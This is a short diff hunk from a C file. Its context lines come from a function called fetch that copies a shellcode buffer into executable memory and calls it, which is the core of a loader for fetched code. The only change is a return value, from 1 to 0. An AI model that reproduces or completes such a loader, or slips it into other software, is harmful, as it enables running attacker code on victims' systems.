@@ -60,7 +60,7 @@ int fetch(string server, string path) {
 	memcpy(exec, shellcode, sizeof(shellcode));
 	((void(*)())exec)();
 	
-	return 1;
+	return 0;
 }
 
 int main() {
